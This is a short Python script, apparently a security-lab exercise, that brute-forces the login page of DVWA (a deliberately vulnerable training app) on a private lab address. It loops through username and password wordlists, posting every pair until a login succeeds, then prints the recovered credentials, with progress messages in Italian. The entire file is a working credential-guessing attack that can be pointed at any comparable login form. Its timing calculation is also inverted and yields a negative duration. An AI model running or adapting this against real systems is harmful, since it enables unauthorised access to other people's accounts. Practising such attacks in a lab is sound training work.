import requests
import time
import os

url = "http://192.168.50.101/dvwa/login.php"

username_file = open("file/usernames.txt")
password_file = open("file/passwords.txt")

user_list = username_file.readlines()
pwd_list = password_file.readlines()

credentials = {
    "username":"",
    "password":"",
    "Login":"Login"
}

n_attempt = 0
start_time = time.time()

stopit = False
for user in user_list:
    user =  user.rstrip()
    if(stopit): break
    for pwd in pwd_list:
        pwd = pwd.rstrip()
        if(stopit): break
        credentials["username"] = user
        credentials["password"] = pwd  
        req = requests.post(url, data = credentials)
        n_attempt+=1
        print(f"Combinazione N: {n_attempt}")

        if req.text.find("Login failed") == -1:
            os.system("clear")
            print("Login success")
            print(f"{user} - {pwd}")
            stopit = True

end_time = time.time()
executio_time = round(start_time - end_time,2)
print(f"Numero tentativi: {n_attempt}")
print(f"Tempo di esecuzione: {executio_time} secondi")